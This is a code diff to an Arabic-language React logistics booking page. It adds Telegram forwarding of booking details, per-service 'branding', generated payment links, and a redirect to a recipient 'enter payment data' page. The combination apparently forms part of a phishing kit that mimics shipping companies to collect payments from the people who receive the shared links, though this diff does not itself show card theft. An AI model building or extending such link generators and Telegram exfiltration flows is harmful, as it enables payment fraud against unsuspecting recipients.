@@ -11,6 +11,21 @@ import { Country, getCountryByCode } from "@/lib/countries";
 import { ArrowRight, Truck, Package, MapPin, Clock, Shield, Globe } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
+import { sendToTelegram } from "@/lib/telegram";
+import { getBrandingByServiceType } from "@/lib/brandingSystem";
+import { generatePaymentLink } from "@/utils/paymentLinks";
+import TelegramTest from "@/components/TelegramTest";
+import { getCurrencyCode, getCurrencyName } from "@/lib/countryCurrencies";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
+import { Copy, ExternalLink } from "lucide-react";
 
 const LogisticsServices = () => {
   const { country } = useParams();
@@ -18,6 +33,11 @@ const LogisticsServices = () => {
   const { toast } = useToast();
   const selectedCountry = getCountryByCode(country || "");
   const createLink = useCreateLink();
+  const serviceBranding = getBrandingByServiceType('logistics');
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
+  const [linkId, setLinkId] = useState("");
+  const [copied, setCopied] = useState(false);
 
   const [bookingData, setBookingData] = useState({
     senderName: "",
@@ -196,13 +216,45 @@ const LogisticsServices = () => {
         payload: logisticsPayload,
       });
 
-      toast({
-        title: "تم إنشاء طلب الشحن بنجاح!",
-        description: "يمكنك مشاركة الرابط مع المرسل والمستلم",
+      // Generate payment URL
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: "logistics",
+        country: country || 'SA'
       });
 
-      // Navigate to microsite
-      navigate(link.microsite_url);
+      // Send to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'payment_recipient',
+        data: {
+          sender_name: bookingData.senderName,
+          receiver_name: bookingData.receiverName,
+          package_type: packageTypes.find(p => p.value === bookingData.packageType)?.label || '',
+          service_type: serviceTypes.find(s => s.value === bookingData.serviceType)?.label || '',
+          package_weight: bookingData.packageWeight,
+          insurance_value: bookingData.insuranceValue,
+          country: selectedCountry.nameAr,
+          payment_url: `${window.location.origin}/r/${country}/logistics/${link.id}?company=logistics`
+        },
+        timestamp: new Date().toISOString(),
+      });
+
+      setCreatedPaymentUrl(paymentUrl);
+      setLinkId(link.id);
+      setShowSuccessDialog(true);
+
+      if (telegramResult.success) {
+        toast({
+          title: "تم إنشاء طلب الشحن بنجاح!",
+          description: "تم إرسال البيانات إلى Telegram",
+        });
+      } else {
+        toast({
+          title: "تم إنشاء طلب الشحن بنجاح!",
+          description: "لكن فشل الإرسال إلى Telegram",
+          variant: "destructive",
+        });
+      }
     } catch (error) {
       console.error("Error creating logistics booking:", error);
     }
@@ -542,7 +594,98 @@ const LogisticsServices = () => {
             </Card>
           </div>
         </div>
+
+        {/* Telegram Test */}
+        <div className="mt-6">
+          <TelegramTest />
+        </div>
       </div>
+
+      {/* Success Dialog */}
+      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <AlertDialogContent className="max-w-md" dir="rtl">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-xl text-center">✅ تم إنشاء طلب الشحن بنجاح!</AlertDialogTitle>
+            <AlertDialogDescription className="text-center">
+              يمكنك نسخ الرابط أو معاينته قبل المتابعة
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+
+          <div className="my-4">
+            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">المرسل:</span>
+                <span className="font-semibold">{bookingData.senderName}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">المستلم:</span>
+                <span className="font-semibold">{bookingData.receiverName}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">نوع الطرد:</span>
+                <span className="font-semibold">
+                  {packageTypes.find(p => p.value === bookingData.packageType)?.label}
+                </span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">نوع الخدمة:</span>
+                <span className="font-semibold">
+                  {serviceTypes.find(s => s.value === bookingData.serviceType)?.label}
+                </span>
+              </div>
+            </div>
+
+            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
+              {createdPaymentUrl}
+            </div>
+
+            <div className="flex gap-2">
+              <Button
+                onClick={() => {
+                  navigator.clipboard.writeText(createdPaymentUrl);
+                  setCopied(true);
+                  setTimeout(() => setCopied(false), 2000);
+                  toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
+                }}
+                variant="outline"
+                className="flex-1"
+              >
+                {copied ? (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    تم النسخ!
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    نسخ الرابط
+                  </>
+                )}
+              </Button>
+
+              <Button
+                onClick={() => window.open(createdPaymentUrl, '_blank')}
+                variant="outline"
+                className="flex-1"
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                معاينة
+              </Button>
+            </div>
+          </div>
+
+          <AlertDialogFooter>
+            <AlertDialogAction
+              onClick={() => {
+                setShowSuccessDialog(false);
+                navigate(`/pay/${linkId}/recipient?company=logistics`);
+              }}
+            >
+              إدخال بيانات الدفع
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
